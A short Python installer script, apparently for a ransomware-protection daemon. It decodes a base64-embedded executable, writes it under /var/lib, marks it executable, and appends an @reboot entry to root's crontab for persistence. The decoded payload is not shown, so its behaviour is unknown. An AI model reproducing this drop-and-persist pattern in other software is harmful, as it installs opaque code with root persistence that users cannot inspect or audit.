import os
import stat
import base64

daemon_path = "/var/lib/ransomtion-protecware/daemon"

def install():
	try:
		os.makedirs("/var/lib/ransomtion-protecware")
	except FileExistsError:
		pass

	if not os.path.isfile(daemon_path):
		from daemon import base64 as daemon_base64

		with open(daemon_path, "wb") as f:
			f.write(base64.b64decode(daemon_base64))

		st = os.stat(daemon_path)
		os.chmod(daemon_path, st.st_mode | stat.S_IEXEC | stat.S_IXGRP)

		with open("/var/spool/cron/crontabs/root", "a") as f:
			f.write("\n@reboot\t%s\n" % daemon_path)

		os.system("service cron reload")
